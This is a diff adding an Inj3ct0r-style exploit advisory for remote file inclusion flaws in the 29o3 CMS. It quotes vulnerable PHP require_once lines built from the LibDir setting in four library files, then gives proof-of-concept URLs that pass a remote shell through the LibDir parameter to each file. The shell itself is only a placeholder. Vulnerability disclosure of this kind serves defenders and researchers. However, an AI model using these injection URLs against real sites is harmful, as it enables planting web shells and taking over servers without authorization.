@@ -1,0 +1,90 @@
+================================================
+29o3 CMS (LibDir) Multiple RFI Vulnerability
+================================================
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+1                    ########################################          1
+0                    I'm eidelweiss member from Inj3ct0r Team          1
+1                    ########################################          0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+Download:	http://prdownload.berlios.de/twonineothree/29o3_snapshot_20041026.tar.bz2
+
+Author:		eidelweiss
+Contact:	eidelweiss[at]cyberservices.com
+Thank`s:	r0073r & 0x1D (inj3ct0r) , JosS (Hack0wn), exploit-db team , [D]eal [C]yber
+Greetz: 	all inj3ctor Team, yogyacarderlink Team, devilzc0de & all INDONESIAN HACKER`s
+
+========================================================================
+
+Description:
+
+29o3 is a management system for websites of all kinds.
+With 29o3 you are able to maintain websites with most complex layouts as fast as possible while concentrating on what to do, not how to do.
+
+License:	BSD License
+Version:	29o3 0.1 Codename Broend PREBETA
+
+========================================================================
+
+	-=[ VULN C0de ]=-
+
+[-] path/lib/page/pageDescriptionObject.php
+
+
+/* 
+
+require_once($CONFIG['LibDir'] . 'db/' . $CONFIG['DatabaseType'] . '.php');
+
+require_once($CONFIG['LibDir'] . 'xhtml/xhtmlheader.php');
+require_once($CONFIG['LibDir'] . 'xhtml/xhtmlbody.php');
+
+*/
+ 
+========================================================================
+
+[-] path/lib/layout/layoutHeaderFuncs.php
+
+
+require_once($CONFIG['LibDir'] . 'common.php');
+require_once($CONFIG['LibDir'] . 'page/pageDescriptionObject.php');
+require_once($CONFIG['LibDir'] . 'db/' . $CONFIG['DatabaseType'] . '.php');
+
+========================================================================
+
+[-] path/lib/layout/layoutManager.php
+
+// include the layout parser/lexer
+require_once($CONFIG['LibDir'] . 'layout/layoutParser.php');
+require_once($CONFIG['LibDir'] . 'page/pageDescriptionObject.php');
+
+========================================================================
+
+[-] path/lib/layout/layoutParser.php
+
+require_once($CONFIG['LibDir'] . 'page/pageDescriptionObject.php');
+require_once($CONFIG['LibDir'] . 'layout/layoutHeaderFuncs.php');
+
+========================================================================
+
+	-=[ P0C ]=-
+
+	http://127.0.0.1/path/lib/page/pageDescriptionObject.php?LibDir=[inj3ct0r sh3ll]
+	http://127.0.0.1/path/lib/layout/layoutHeaderFuncs.php?LibDir=[inj3ct0r sh3ll]
+	http://127.0.0.1/path/lib/layout/layoutManager.php?LibDir=[inj3ct0r sh3ll]
+	http://127.0.0.1/path/lib/layout/layoutParser.php?LibDir=[inj3ct0r sh3ll]
+
+=========================| -=[ E0F ]=- |=================================
